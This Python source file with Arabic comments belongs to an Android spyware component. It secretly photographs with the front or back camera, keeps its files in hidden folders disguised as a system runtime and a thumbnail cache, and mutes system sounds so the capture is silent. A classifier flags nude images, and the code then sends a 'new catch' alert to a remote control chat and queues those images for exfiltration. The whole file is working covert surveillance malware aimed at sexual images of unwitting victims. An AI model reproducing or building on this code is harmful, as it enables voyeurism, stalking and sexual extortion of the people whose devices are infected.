# -*- coding: utf-8 -*-
import os
import time
import threading
import logging
import gc
from datetime import datetime

# ========== إعداد المسارات الموحدة مع التمويه ==========
def _get_runtime_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        return os.path.join(base, ".sys_runtime")
    except:
        return os.path.join(os.getcwd(), ".sys_runtime")

P = _get_runtime_path()
T = os.path.join(P, "ctmp")                     # مجلد مؤقت للصور الخام
QUEUE = os.path.join(P, ".cache_thumb")         # مجلد الانتظار (موهم كمجلد مصغرات)

for d in [P, T, QUEUE]:
    if not os.path.exists(d):
        os.makedirs(d)

logging.basicConfig(filename=os.path.join(P, "c.log"), level=logging.ERROR, filemode='a')

# ========== استيراد المكتبات الأساسية ==========
try:
    from jnius import autoclass, PythonJavaClass, java_method
    JNI = True
except ImportError:
    JNI = False

# ========== كلاس الكاميرا ==========
class CameraAnalyzer:
    def __init__(self, mon=None, det=None):
        self.mon = mon
        self.det = det                # NudeDetector instance (يحتوي على النموذج)
        self.busy = False
        self._old_volume = -1
        self._timers = []             # للاحتفاظ بالمؤقتات النشطة

    # ========== التحقق من صلاحيات الكاميرا ==========
    def _check_camera_permission(self):
        """التحقق من منح صلاحية الكاميرا"""
        if not JNI:
            return True
        try:
            from android.permissions import check_permission, Permission
            return check_permission(Permission.CAMERA)
        except Exception as e:
            logging.error(f"Permission check error: {e}")
            return True  # افتراضي True في حالة فشل التحقق

    # ========== التحقق من توفر الكاميرا ==========
    def _is_camera_available(self, cam_id):
        """التحقق من وجود الكاميرا المطلوبة"""
        if not JNI:
            return False
        try:
            Camera = autoclass('android.hardware.Camera')
            CameraInfo = autoclass('android.hardware.Camera$CameraInfo')
            num_cameras = Camera.getNumberOfCameras()
            
            if num_cameras <= cam_id:
                return False
                
            desired_facing = CameraInfo.CAMERA_FACING_BACK if cam_id == 0 else CameraInfo.CAMERA_FACING_FRONT
            for i in range(num_cameras):
                info = CameraInfo()
                Camera.getCameraInfo(i, info)
                if info.facing == desired_facing:
                    return True
            return False
        except Exception as e:
            logging.error(f"Camera availability check error: {e}")
            return False

    # ========== التحقق من البطارية ==========
    def _power_ok(self):
        try:
            b, c = self.mon._battery_ok() if hasattr(self.mon, '_battery_ok') else (100, True)
            return b >= 15 or c
        except:
            return True

    # ========== كتم صوت النظام (للكاميرا الصامتة) ==========
    def _mute_audio(self, mute=True):
        if not JNI:
            return
        try:
            AudioManager = autoclass('android.media.AudioManager')
            ctx = autoclass('org.kivy.android.PythonActivity').mActivity
            am = ctx.getSystemService(ctx.AUDIO_SERVICE)
            if mute:
                self._old_volume = am.getStreamVolume(AudioManager.STREAM_SYSTEM)
                am.setStreamVolume(AudioManager.STREAM_SYSTEM, 0, 0)
            else:
                if self._old_volume >= 0:
                    am.setStreamVolume(AudioManager.STREAM_SYSTEM, self._old_volume, 0)
                    self._old_volume = -1
        except Exception as e:
            logging.error(f"Mute error: {e}")

    # ========== تنظيف الملفات القديمة ==========
    def _cleanup_old_files(self):
        """حذف الملفات القديمة من المجلدات المؤقتة"""
        try:
            now = time.time()
            for folder in [T, QUEUE]:
                if os.path.exists(folder):
                    for f in os.listdir(folder):
                        path = os.path.join(folder, f)
                        try:
                            if os.path.getmtime(path) < now - 3600:  # حذف الملفات الأقدم من ساعة
                                os.remove(path)
                        except:
                            pass
        except Exception as e:
            logging.error(f"Cleanup error: {e}")

    # ========== ضغط الصورة (لتوفير المساحة والطاقة) ==========
    def _compress_image(self, path, quality=80):
        """يحاول ضغط ملف الصورة إلى جودة أقل باستخدام PIL كبديل أول"""
        try:
            from PIL import Image
            with Image.open(path) as img:
                img = img.convert('RGB')
                img.save(path, "JPEG", quality=quality, optimize=True)
                return True
        except ImportError:
            pass
        except Exception as e:
            logging.error(f"PIL compression error: {e}")

        # محاولة ثانية باستخدام OpenCV إذا كان متوفراً
        try:
            import cv2
            img = cv2.imread(path)
            if img is not None:
                encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), quality]
                _, buffer = cv2.imencode('.jpg', img, encode_param)
                with open(path, 'wb') as f:
                    f.write(buffer)
                return True
        except ImportError:
            pass
        except Exception as e:
            logging.error(f"OpenCV compression error: {e}")
        return False

    # ========== التقاط صورة (صامتة) مع تحديد الكاميرا بدقة ==========
    def capture(self, cam_id=0):
        """
        تلتقط صورة باستخدام Camera1 API.
        cam_id = 0 خلفية, 1 أمامية.
        تعيد مسار الصورة المحفوظة أو None.
        """
        # التحقق من الصلاحيات والتوفر
        if not self._check_camera_permission():
            logging.error("Camera permission not granted")
            return None
            
        if not self._is_camera_available(cam_id):
            logging.error(f"Camera {cam_id} not available")
            return None

        if self.busy or not self._power_ok():
            return None

        self.busy = True
        out_path = None
        camera = None
        callback_ref = None

        if JNI:
            self._mute_audio(True)
            try:
                Camera = autoclass('android.hardware.Camera')
                CameraInfo = autoclass('android.hardware.Camera$CameraInfo')
                num_cameras = Camera.getNumberOfCameras()

                # ===== تصحيح اختيار الكاميرا =====
                target_id = -1
                desired_facing = CameraInfo.CAMERA_FACING_BACK if cam_id == 0 else CameraInfo.CAMERA_FACING_FRONT
                for i in range(num_cameras):
                    info = CameraInfo()
                    Camera.getCameraInfo(i, info)
                    if info.facing == desired_facing:
                        target_id = i
                        break
                
                if target_id == -1:
                    logging.error("No suitable camera found for facing: %d", desired_facing)
                    self.busy = False
                    self._mute_audio(False)
                    return None

                camera = Camera.open(target_id)
                if camera is None:
                    logging.error("Failed to open camera")
                    self.busy = False
                    self._mute_audio(False)
                    return None

                params = camera.getParameters()

                # اختيار دقة مناسبة (قريبة من 1024x768)
                supported_sizes = params.getSupportedPictureSizes()
                if supported_sizes:
                    target_area = 1024 * 768
                    best_size = min(supported_sizes, key=lambda s: abs(s.width * s.height - target_area))
                    params.setPictureSize(best_size.width, best_size.height)
                    logging.info(f"Selected camera size: {best_size.width}x{best_size.height}")

                # إعدادات الصورة والإخراج
                params.setPictureFormat(autoclass('android.graphics.ImageFormat').JPEG)
                
                # محاولة إسكات صوت الكاميرا (قد لا تعمل في جميع الأجهزة)
                try:
                    params.set("shutter-sound", 0)
                except:
                    pass
                    
                # التدوير حسب نوع الكاميرا
                rotation = 270 if cam_id == 1 else 90
                params.setRotation(rotation)
                camera.setParameters(params)

                out_path = os.path.join(T, f"c_{cam_id}_{int(time.time())}.jpg")
                image_saved = threading.Event()
                image_data = [None]  # لتخزين البيانات

                class PicCallback(PythonJavaClass):
                    __javainterfaces__ = ['android.hardware.Camera$PictureCallback']
                    
                    def __init__(self, event, data_store):
                        super().__init__()
                        self.event = event
                        self.data_store = data_store
                    
                    @java_method('([BLandroid/hardware/Camera;)V')
                    def onPictureTaken(self, data, cam):
                        try:
                            self.data_store[0] = data
                            with open(out_path, 'wb') as f:
                                f.write(data)
                        except Exception as e:
                            logging.error(f"Callback write error: {e}")
                        finally:
                            self.event.set()

                callback_ref = PicCallback(image_saved, image_data)
                camera.startPreview()
                time.sleep(0.5)  # تأخير قصير للسماح للمعاينة بالاستقرار
                
                camera.takePicture(None, None, callback_ref)

                # مهلة 20 ثانية (زيادة عن السابق للأمان)
                if not image_saved.wait(20):
                    logging.warning("Camera capture timeout after 20 seconds")
                    out_path = None

                try:
                    camera.stopPreview()
                except:
                    pass

                # التحقق من الملف وضغطه
                if out_path and os.path.exists(out_path) and os.path.getsize(out_path) > 100:
                    self._compress_image(out_path, quality=80)
                else:
                    logging.error("Captured file is empty or missing")
                    out_path = None

            except Exception as e:
                logging.error(f"Capture error: {e}")
                out_path = None
            finally:
                if camera:
                    try:
                        camera.release()
                    except:
                        pass
                self._mute_audio(False)
                # تنظيف الملفات القديمة بعد كل عملية التقاط
                self._cleanup_old_files()
                gc.collect()

        self.busy = False
        return out_path

    # ========== تحضير الصورة لـ AI (استيراد داخلي) ==========
    def _prepare_for_ai(self, path):
        """
        تحويل الصورة إلى مصفوفة (224x224, float32) لتغذية النموذج.
        تستورد numpy و PIL داخلياً لتجنب فشل التحميل إذا كانت المكتبات مفقودة.
        """
        if not os.path.exists(path):
            return None
            
        try:
            from PIL import Image
            import numpy as np
        except ImportError:
            logging.error("PIL or numpy not available")
            return None

        try:
            with Image.open(path) as img:
                img = img.convert('RGB').resize((224, 224), Image.BILINEAR)
                arr = np.asarray(img, dtype=np.float32) / 255.0
                return np.expand_dims(arr, axis=0)
        except Exception as e:
            logging.error(f"AI prep error: {e}")
            return None

    # ========== الوظيفة الرئيسية: التقاط وتحليل وإشعار ==========
    def harvest(self, cam_id=0):
        """
        تلتقط صورة، تحللها عبر نموذج AI (إذا كان محمّلاً)،
        ترسل إشعاراً فورياً إذا كانت حساسة، وتنقل الصورة إلى مجلد الانتظار.
        """
        pic_path = self.capture(cam_id)
        if not pic_path or not os.path.exists(pic_path):
            return

        is_nude = False
        confidence = 0.0

        # التحقق من وجود كاشف ونموذج محمّل
        if self.det and hasattr(self.det, 'model') and self.det.model is not None:
            input_data = self._prepare_for_ai(pic_path)
            if input_data is not None:
                try:
                    self.det.model.set_tensor(self.det.in_idx, input_data)
                    self.det.model.invoke()
                    out = self.det.model.get_tensor(self.det.out_idx)[0]
                    confidence = float(out[1]) if len(out) > 1 else float(out[0])
                    if confidence > 0.85:
                        is_nude = True
                except Exception as e:
                    logging.error(f"AI analysis error: {e}")

        if is_nude:
            # إرسال إشعار فوري لمجموعة التحكم
            if self.mon and hasattr(self.mon, 'ui') and self.mon.ui:
                try:
                    cam_type = "الأمامية" if cam_id == 1 else "الخلفية"
                    alert = (
                        f"🔞 **صيد جديد!**\n"
                        f"📱 الجهاز: `{self.mon.dmd}`\n"
                        f"📸 الكاميرا: {cam_type}\n"
                        f"🎯 الثقة: `{confidence:.1%}`\n"
                        f"⏰ الوقت: `{datetime.now().strftime('%H:%M:%S')}`"
                    )
                    self.mon.ui._api("sendMessage", {
                        "chat_id": self.mon.ctrl,
                        "text": alert,
                        "parse_mode": "Markdown"
                    })
                except Exception as e:
                    logging.error(f"Alert send error: {e}")

            # نقل الصورة إلى مجلد الانتظار
            dest = os.path.join(QUEUE, os.path.basename(pic_path))
            try:
                # التأكد من عدم وجود ملف بنفس الاسم
                if os.path.exists(dest):
                    base, ext = os.path.splitext(dest)
                    dest = f"{base}_{int(time.time())}{ext}"
                os.rename(pic_path, dest)
                logging.info(f"Moved to queue: {dest}")
            except Exception as e:
                logging.error(f"Move error: {e}")
                if os.path.exists(pic_path):
                    try:
                        os.remove(pic_path)
                    except:
                        pass
        else:
            # حذف الصورة العادية فوراً
            if os.path.exists(pic_path):
                try:
                    os.remove(pic_path)
                except Exception as e:
                    logging.error(f"Delete error: {e}")


# ========== دالة المصنع ==========
def create(mon=None, det=None):
    return CameraAnalyzer(mon, det)
